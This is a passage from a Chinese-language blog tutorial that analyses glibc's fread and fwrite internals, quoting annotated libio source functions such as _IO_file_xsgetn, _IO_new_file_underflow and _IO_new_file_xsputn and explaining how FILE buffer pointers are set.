<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_file_xsgetn<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p>​    接下来对_IO_file_xsgetn这三部分进行跟进并分析。</p> <p>​    首先在fp-&gt;_IO_buf_base为空时，也就是输入缓冲区未建立时，代码调用_IO_doallocbuf去建立输入缓冲区。跟进_IO_doallocbuf函数，看下它是如何初始化缓冲区的，为输入缓冲区分配空间的，文件在/libio/genops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span> # 如果输入缓冲区不为空，直接返回
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_UNBUFFERED<span class="token punctuation">)</span> <span class="token operator">||</span> fp<span class="token operator">-&gt;</span>_mode <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> # 检查标志位
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_DOALLOCATE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> # 调用vtable函数
      <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token function">_IO_setb</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_shortbuf<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_shortbuf<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_doallocbuf<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>​    函数首先检查fp-&gt;_IO_buf_base是否为空，如果不为空表明该输入缓冲区已被初始化，那么直接返回。如果为空，则检查fp-&gt;_flags看它是不是_IO_UNBUFFERED或者fp-&gt;_mode大于0，如果满足条件则调用FILE的vtable中的_IO_file_doallocate，跟进该函数，在/libio/filedoalloc.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token function">_IO_file_doallocate</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_size_t size<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">stat64</span> st<span class="token punctuation">;</span>

  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  size <span class="token operator">=</span> _IO_BUFSIZ<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_fileno <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">_IO_SYSSTAT</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> # 调用_IO_SYSSTAT获取FILE信息
   <span class="token punctuation">{</span>
     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_blksize <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
         size <span class="token operator">=</span> st<span class="token punctuation">.</span>st_blksize<span class="token punctuation">;</span>
     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token punctuation">}</span>
 p <span class="token operator">=</span> <span class="token function">malloc</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token function">_IO_setb</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> p<span class="token punctuation">,</span> p <span class="token operator">+</span> size<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> # 调用_IO_setb设置FILE缓冲区
  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_file_doallocate<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>​    可以看到_IO_file_doallocate函数是分配输入缓冲区的实现函数，首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的__stat函数。获取文件信息，修改相应需要申请的size。可以看到在执行完_IO_SYSSTAT函数后，st结构体的值为下图所示。</p> <p><img src="/images/heap/image-20211226164452851.png" alt="image-20211226164452851"></p> <p>​    因此size被修改为st.st_blksize所对应大小的4096即0x1000，接着调用malloc去申请内存，申请出来的堆块如下图所示。</p> <p><img src="/images/heap/image-20211226164457878.png" alt="image-20211226164457878"></p> <p>​    空间申请出来后，调用_IO_setb，跟进去看它干了些啥，文件在/libio/genops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">_IO_setb</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>b<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>eb<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  f<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">=</span> b<span class="token punctuation">;</span> # 设置_IO_buf_base 
  f<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">=</span> eb<span class="token punctuation">;</span> # 设置_IO_buf_end
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_setb<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>​    函数逻辑比较简单，就是设置了_IO_buf_base和_IO_buf_end，那么在IO_setb执行完之后，fp的这两个指针被赋上了值。</p> <p><img src="/images/heap/image-20211226164516644.png" alt="image-20211226164516644"></p> <p>​    到此，初始化缓冲区就完成了，函数返回_IO_file_doallocate后，接着_IO_file_doallocate也返回，回到_IO_file_xsgetn函数中。</p> <p>​    接下来程序也就进入到了第二部分，拷贝输入缓冲区数据，如果输入缓冲区存在已输入的数据，则把它直接拷贝到目标缓冲区里。</p> <p>​    需要说明下的是从这里可以看出来fp-&gt;_IO_read_ptr指向的是输入缓冲区的起始地址，fp-&gt;_IO_read_end指向的是输入缓冲区的结束地址。</p> <p>​    将fp-&gt;_IO_read_ptr到fp-&gt;_IO_read_end之间的数据通过memcpy拷贝到目标缓冲区中。</p> <p>​    在输入缓冲区为0或者是不能满足需求的时候则会执行到最后一步__underflow去执行系统调用read读取数据，并放入到输入缓冲区里。因为我们的这个示例程序是第一次读取数据，此时的fp-&gt;_IO_read_end和fp-&gt;_IO_read_ptr都是0，因此会进入到__underflow，跟进去细看，文件在/libio/genops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span>
<span class="token function">__underflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>

  # 额外的检查
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 调用_IO_UNDERFLOW
  <span class="token keyword">return</span> <span class="token function">_IO_UNDERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__underflow<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>​    函数稍微做一些检查就会调用_IO_UNDERFLOW函数，其中一个检查是如果fp-&gt;_IO_read_ptr小于fp-&gt;_IO_read_end则表明输入缓冲区里存在数据，可直接返回，否则表示需要继续读入数据。该函数是FILE结构体vtable里的_IO_new_file_underflow，跟进去看文件在/libio/fileops.c。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span>
<span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_ssize_t count<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 如果存在_IO_NO_READS标志，则直接返回
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      fp<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  # 如果输入缓冲区里存在数据，则直接返回
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  ## 如果没有输入缓冲区，则调用_IO_doallocbuf分配输入缓冲区
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
      <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 设置FILE结构体指针
  fp<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_write_end
    <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
  # 调用_IO_SYSREAD函数最终执行系统调用读取数据
  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span>
               fp<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 设置结构体指针
  fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">+=</span> count<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>​    这个<code>_IO_new_file_underflow</code>函数，是最终调用系统调用的地方，在最终执行系统调用之前，仍然有一些检查，整个流程为：</p> <ol><li><p>检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 /* Reading not allowed */。</p></li> <li><p>如果fp-&gt;_IO_buf_base为NULL，则调用_IO_doallocbuf分配输入缓冲区。</p></li> <li><p>接着初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base</p></li> <li><p>调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，数据读入到fp-&gt;_IO_buf_base中，读入大小为输入缓冲区的大小fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。</p></li> <li><p>设置输入缓冲区已有数据的size，即设置fp-&gt;_IO_read_end为fp-&gt;_IO_read_end += count。</p></li></ol> <p>​    其中第二步里面的如果<code>fp-&gt;_IO_buf_base</code>为NULL，则调用<code>_IO_doallocbuf</code>分配输入缓冲区。</p> <p>​    其中第四步的<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数）的源码比较简单，就是执行系统调用函数read去读取文件数据，文件在<code>libio/fileops.c</code>，源码如下：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_ssize_t
<span class="token function">_IO_file_read</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> _IO_ssize_t size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags2 <span class="token operator">&amp;</span> _IO_FLAGS2_NOTCANCEL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
           <span class="token operator">?</span> <span class="token function">read_not_cancel</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_fileno<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span>
           <span class="token operator">:</span> <span class="token function">read</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_fileno<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>​    _IO_file_underflow函数执行完毕以后，FILE结构体中各个指针已被赋值，且文件数据已读入，输入缓冲区里已经有数据，结构体值如下，其中fp-&gt;_IO_read_ptr指向输入缓冲区数据的开始位置，fp-&gt;_IO_read_end指向输入缓冲区数据结束的位置：</p> <p>​     <img src="/images/heap/image-20211226164632633.png" alt="image-20211226164632633"></p> <p>函数执行完，返回到_IO_file_xsgetn函数中，由于while循环的存在，重新执行第二部分，此时将输入缓冲区拷贝到目标缓冲区，最终返回。</p> <p>​    至此，对于fread的源码分析结束。、</p> <h2 id="io-file之fwrite">IO_FILE之fwrite <a href="#io-file之fwrite" class="header-anchor">#</a></h2> <p>​    在开始上源码之前，还是将fwrite的总体流程先描述一遍，好让大家有个大概的概念。</p> <p>​    fwrite函数的总体流程图如下。</p> <p><img src="/images/heap/image-20211226164648994.png" alt="image-20211226164648994"></p> <p>fwrite的主要实现在_IO_new_file_xsputn中，整体流程包含四个部分。</p> <ol><li><p>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝到输出缓冲区。</p></li> <li><p>如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用_IO_OVERFLOW建立输出缓冲区或刷新输出缓冲区。</p></li> <li><p>输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用sys_write输出目标数据。</p></li> <li><p>如果按块输出数据后还剩一点数据则调用_IO_default_xsputn将数据拷贝到输出缓冲区。</p></li></ol> <p>​    接着介绍一下其中涉及的几个IO_FILE结构体的指针。</p> <table><thead><tr><th>指针</th> <th>描述</th></tr></thead> <tbody><tr><td>_IO_buf_base</td> <td>输入输出缓冲区基地址</td></tr> <tr><td>_IO_buf_end</td> <td>输入输出缓冲区结束地址</td></tr> <tr><td>_IO_write_base</td> <td>输出缓冲区基地址</td></tr> <tr><td>_IO_write_ptr</td> <td>输入缓冲区当前地址</td></tr> <tr><td>_IO_write_end</td> <td>输出缓冲区结束地址</td></tr></tbody></table> <p>​    其中_IO_buf_base和_IO_buf_end是缓冲区建立函数_IO_doallocbuf（上小结详细描述过）会在里面建立输入输出缓冲区，并把基地址保存在_IO_buf_base中，结束地址保存在_IO_buf_end中。在建立输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址给_IO_write_base，结束地址给_IO_write_end，同时_IO_write_ptr表示为已经使用的地址。即_IO_write_base到_IO_write_ptr之间的空间是已经使用的缓冲区，_IO_write_ptr到_IO_write_end之间为剩余的输出缓冲区。</p> <p>​    fwrite函数的原型</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>size_t <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t nmemb<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ptr</span><span class="token expression"><span class="token operator">--</span> 这是指向要被写入的元素数组的指针。</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">size</span><span class="token expression"><span class="token operator">--</span> 这是要被写入的每个元素的大小，以字节为单位。</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">nmemb</span><span class="token expression"><span class="token operator">--</span> 这是元素的个数，每个元素的大小为 size 字节。</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">stream</span><span class="token expression"><span class="token operator">--</span> 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输出流。</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>首先仍然是一个示例程序。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>​    编译完成之后，使用gdb进行调试，在fwrite处下断点。看到程序首先断在_IO_fwrite处。</p> <p><img src="/images/heap/image-20211226164754206.png" alt="image-20211226164754206"></p> <p>​    在开始调试之前，还是先把传入的IO_FILE的fp值看一下，如下图所示。</p> <p><img src="/images/heap/image-20211226164802873.png" alt="image-20211226164802873"></p> <p>​    此时vtable中的内容如下图。</p> <p><img src="/images/heap/image-20211226164811648.png" alt="image-20211226164811648"></p> <p>​    从图中可以看出刚经过fopen初始化，输入输出缓冲区没有建立，此时所有指针都为空。_IO_fwrite函数在文件/libio/iofwrite.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_size_t
<span class="token function">_IO_fwrite</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> _IO_size_t size<span class="token punctuation">,</span> _IO_size_t count<span class="token punctuation">,</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_size_t request <span class="token operator">=</span> size <span class="token operator">*</span> count<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    written <span class="token operator">=</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_fwrite<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>​    没有做过多操作就调用了_IOsputn函数，该函数是vtable中的__xsputn(_IO_new_file_xsputn)在文件/libio/fileops.c中。源码分析从四个部分进行，其中下面每部分代码都是_IO_new_file_xsputn函数中的源码。</p> <p>​    第一部分所包含的代码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_size_t
<span class="token function">_IO_new_file_xsputn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
<span class="token punctuation">{</span> 

    _IO_size_t count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    # 判断输出缓冲区还有多少空间
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">&gt;</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">)</span>
    count <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span> <span class="token comment">/* Space available. */</span>

  # 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区
  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
